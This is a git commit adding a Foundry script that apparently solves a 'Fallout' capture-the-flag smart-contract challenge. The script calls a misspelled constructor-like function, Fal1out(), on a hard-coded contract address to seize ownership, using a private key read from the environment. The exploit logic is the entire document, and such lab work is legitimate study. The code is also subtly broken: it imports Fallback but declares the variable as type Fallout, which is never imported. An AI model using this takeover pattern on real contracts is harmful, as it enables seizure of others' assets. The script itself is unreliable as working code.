6b5e87f76c78ab205b0e9359c3b1dcc0d136e1e8
Patrick-Ngururi <patrick9ngururi8@gmail.com>
2026-02-16 17:48:05 +0300

    Fallout challenge setup

---
+++ script/Fallout/FalloutSolution.s.sol
@@ -0,0 +1,21 @@
+// SPDX-License-Identifier: MIT
+
+pragma solidity >=0.8.0;
+
+import {Fallback} from "src/Fallout/Fallout.sol";
+import {Script} from "lib/forge-std/src/Script.sol";
+import {console} from "lib/forge-std/src/console.sol";
+
+contract FalloutSolution is Script {
+    Fallout public falloutInstance = Fallback(0x0560756aF3C6E55aa457e53EC07E7bB04e4d98B8);
+
+    function run() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+
+        console.log("Owner before: ", falloutInstance.owner());
+        falloutInstance.Fal1out();
+        console.log("Owner after: ", falloutInstance.owner());
+
+        vm.stopBroadcast();
+    }
+}
